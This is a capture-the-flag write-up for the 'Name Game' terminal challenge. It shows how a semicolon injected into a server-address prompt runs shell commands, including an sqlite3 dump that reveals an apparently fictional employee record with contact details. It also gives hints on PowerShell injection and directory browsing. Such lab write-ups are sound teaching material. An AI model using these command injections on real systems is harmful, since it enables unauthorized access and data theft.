The Name Game
=============

Minty Candycane provides hints for **Objective 2** after you help her with the *The Name Game* Cranberry Pi terminal challenge.

Terminal Challenge
------------------
.. code-block:: none

 We just hired this new worker,
 Californian or New Yorker?
 Think he's making some new toy bag...
 My job is to make his name tag.

 Golly gee, I'm glad that you came,
 I recall naught but his last name!
 Use our system or your own plan,
 Find the first name of our guy "Chan!"
 
 -Bushy Evergreen

 To solve this challenge, determine the new worker's first name and submit to runtoanswer.




 ====================================================================
 =                                                                  =
 = S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =
 =                                                                  =
 ====================================================================




  Press  1 to start the onboard process.
  Press  2 to verify the system.
  Press  q to quit.


 Please make a selection: 

Our Solution
------------
After typing ``2`` the following appears [#f1]_ :

.. code-block:: none

 Validating data store for employee onboard information.
 Enter address of server: 

We observed that if you type ``;ls`` it works as a normal shell.

We see that the following items appear: ``menu.ps1``, ``onboard.db`` and ``runtoanswer``.
Therefore, by using ``; /usr/bin/sqlite3 onboard.db .dump | grep 'Chan'`` we get:

.. code-block:: none

 Validating data store for employee onboard information.
 Enter address of server: ; /usr/bin/sqlite3 onboard.db .dump | grep 'Chan'
 Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
             [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
             [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
             [-w deadline] [-W timeout] [hop1 ...] destination
 INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');
 onboard.db: SQLite 3.x database
 Press Enter to continue...: 

Therefore mr Chan's name is Scott.

Hints for the Terminal Challenge
--------------------------------

.. parsed-literal::
 **PowerShell Command Injection**
 From: Minty Candycane
 `PowerShell Call/& Operator <https://ss64.com/ps/call.html>`_

Hints for KringleCon Objective 2
--------------------------------

.. parsed-literal::
 **Finding Browsable Directories**
 From: Minty Candycane
 On a website, finding browsable directories is sometimes as simple as removing characters from the end of a URL.

.. parsed-literal::
 **Website Directory Browsing**
 From: Minty Candycane
 `Website Directory Browsing <https://portswigger.net/kb/issues/00600100_directory-listing>`_


.. rubric:: Extra Info
.. [#f1] After typing ``1`` we were taken to a registration page, which made us lose some time by trying to use that to solve the challenge. By typing ``q`` one cannot type anything more.
